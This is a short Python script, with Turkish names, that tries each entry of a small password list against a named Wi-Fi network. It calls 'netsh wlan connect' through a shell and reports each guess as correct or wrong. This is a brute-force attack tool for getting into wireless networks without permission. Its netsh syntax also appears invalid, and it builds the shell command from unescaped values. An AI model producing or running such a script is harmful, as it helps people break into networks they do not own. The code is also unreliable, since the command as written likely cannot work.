import subprocess

def denetle(wifi_adi, girdiler):
    for sifre in girdiler:
        cmd = f'netsh wlan connect name="{wifi_adi}" ssid="{wifi_adi}" keyMaterial="{sifre}"'
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        if proc.returncode == 0:
            print(f"Şifre doğru: {sifre}")
        else:
            print(f"Şifre yanlış: {sifre}")

wifi_adi = "wifi_adi"
girdiler = ["Fenerbaçe", "1907", "Coder", "Vi", ".", ",", "!", " "]

denetle(wifi_adi, girdiler)
